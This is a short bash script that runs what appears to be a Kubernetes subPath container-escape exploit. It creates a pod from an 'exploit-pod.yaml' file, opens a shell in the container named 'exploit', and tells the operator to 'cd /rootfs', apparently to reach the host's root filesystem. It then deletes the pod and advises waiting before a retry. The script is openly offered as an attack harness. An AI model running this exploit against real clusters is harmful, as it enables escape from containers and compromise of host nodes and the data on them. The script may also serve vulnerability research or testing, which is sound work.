#!/bin/bash

echo "Create the pod..."
kubectl create -f exploit-pod.yaml
echo "Pod created.  Sleeping a bit to allow them to come up"
sleep 5
echo "Execing into the container.  Run: cd /rootfs"
kubectl exec -it subpath -c exploit -- /bin/bash
echo "Cleaning up"
kubectl delete -f exploit-pod.yaml
echo "Wait 45-60 seconds before trying again"
